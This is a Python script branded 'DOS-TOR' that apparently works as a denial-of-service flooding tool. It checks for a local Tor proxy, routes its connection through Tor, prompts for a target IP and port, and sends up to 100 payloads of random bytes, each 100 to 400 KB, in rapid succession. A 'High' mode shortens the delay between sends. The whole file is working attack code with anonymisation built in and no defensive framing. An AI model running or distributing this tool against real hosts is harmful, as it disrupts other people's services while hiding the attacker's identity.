import subprocess
import sys
import time
import random
import threading
import ctypes

# ------------------------
# CMD color functions
# ------------------------
kernel32 = ctypes.windll.kernel32
STD_OUTPUT_HANDLE = -11

def set_color(color_code):
    kernel32.SetConsoleTextAttribute(kernel32.GetStdHandle(STD_OUTPUT_HANDLE), color_code)

GREEN = 10  # bright green
RED = 12    # bright red

# ------------------------
# ASCII Art for DOS-TOR
# ------------------------
set_color(GREEN)
ascii_art = r"""
██████╗  ██████╗ ███████╗    ████████╗ ██████╗ ██████╗ 
██╔══██╗██╔═══██╗██╔════╝    ╚══██╔══╝██╔═══██╗██╔══██╗
██████╔╝██║   ██║███████╗       ██║   ██║   ██║██████╔╝
██╔═══╝ ██║   ██║╚════██║       ██║   ██║   ██║██╔═══╝ 
██║     ╚██████╔╝███████║       ██║   ╚██████╔╝██║     
╚═╝      ╚═════╝ ╚══════╝       ╚═╝    ╚═════╝ ╚═╝     
"""
print(ascii_art)

# ------------------------
# Low / High selection
# ------------------------
mode = input("Select mode (Low / High): ").strip().lower()
if mode not in ['low', 'high']:
    print("Invalid mode, defaulting to Low.")
    mode = 'low'

# High mode -> red text
if mode == 'high':
    set_color(RED)

# ------------------------
# Automatic module installation
# ------------------------
try:
    import socks
except ImportError:
    print("Installing PySocks module...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pysocks"])
    import socks

import socket

# ------------------------
# Tor check
# ------------------------
TOR_SOCKS_PORT = 9050
TOR_HOST = "127.0.0.1"

def check_tor():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((TOR_HOST, TOR_SOCKS_PORT))
        s.close()
        return True
    except Exception:
        return False

if not check_tor():
    print("Tor is not installed or not running.")
    print("Please install and start Tor, then run again.")
    sys.exit()

# ------------------------
# User input for target (IP/Port with /)
# ------------------------
target_input = input("Enter target (IP/Port as IP/Port, e.g., 127.0.0.1/9999): ").strip()
if '/' not in target_input:
    print("Invalid format. Use IP/Port with /")
    sys.exit()
TARGET_IP, TARGET_PORT = target_input.split('/')
TARGET_PORT = int(TARGET_PORT)
print(f"Target set to {TARGET_IP}/{TARGET_PORT}")

# ------------------------
# Configure socket to use Tor
# ------------------------
socks.set_default_proxy(socks.SOCKS5, TOR_HOST, TOR_SOCKS_PORT)
socket.socket = socks.socksocket

# ------------------------
# Connect to target
# ------------------------
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((TARGET_IP, TARGET_PORT))
    print(f"Connected to {TARGET_IP}/{TARGET_PORT} via Tor")
except Exception as e:
    print(f"Connection failed: {e}")
    sys.exit()

# ------------------------
# Stop flag
# ------------------------
stop_flag = False
def check_stop():
    global stop_flag
    input("Press ENTER to stop sending packets...")
    stop_flag = True

threading.Thread(target=check_stop, daemon=True).start()

# ------------------------
# Packet sending interval
# ------------------------
SLEEP_TIME = 0.05 if mode == 'low' else 0.01  # 50ms for Low, 10ms for High

# ------------------------
# Packet sending loop
# ------------------------
PACKET_COUNT = 100  # number of packets

for i in range(PACKET_COUNT):
    if stop_flag:
        print("Stopping packet sending by user request.")
        break

    # Packet size based on mode
    if mode == 'low':
        size = random.randint(300_000, 400_000)  # 300~400 KB
    else:
        size = random.randint(100_000, 200_000)  # 100~200 KB

    data = bytes([random.randint(0, 255) for _ in range(size)])
    try:
        sock.sendall(data)
        print(f"[{i+1}/{PACKET_COUNT}] {size/1024:.2f} KB sent")
    except Exception as e:
        print(f"Send failed: {e}")
        break

    time.sleep(SLEEP_TIME)

sock.close()
print("All packets sent or stopped.")